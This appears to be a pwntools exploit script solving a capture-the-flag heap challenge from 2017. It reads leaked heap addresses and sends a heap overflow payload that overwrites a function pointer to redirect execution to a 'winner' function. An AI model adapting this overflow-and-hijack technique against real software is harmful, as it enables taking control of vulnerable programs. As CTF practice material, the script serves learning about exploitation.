from pwn import *

if len(sys.argv)==1:
    p=process("linux_server64")
elif sys.argv[1]=="1":
    p=process("./bin")
elif sys.argv[1]=="2":
    p=process("./bin")
elif sys.argv[1]=="3":
    p=remote("functf",18011)

def readline(key):
    buf=p.readline()
    while (buf.find(key)<0):
        buf=p.readline()
    return buf

buf=readline("data")
arr=buf.split()
print arr
heap1=int(arr[3][:-1],16)
heap2=int(arr[7][:-1],16)
nowinner=int(arr[10],16)
winner=nowinner-0x000000000000099a+0x000000000000097b

print 'heap1:',hex(heap1)
print 'heap2:',hex(heap2)
print 'nowinner:',hex(nowinner)        
print 'winner:',hex(winner)        
payload=""
payload+="A"*(heap2-heap1)
payload+=p64(winner)

p.sendline(payload)

p.interactive()

'''
vagrant@vagrant:/hack/fun_ctf_2017/start_heap$ readelf -a start_heap|grep winner
70: 000000000000099a    19 FUNC    GLOBAL DEFAULT   14 nowinner
71: 000000000000097b    31 FUNC    GLOBAL DEFAULT   14 winner
'''
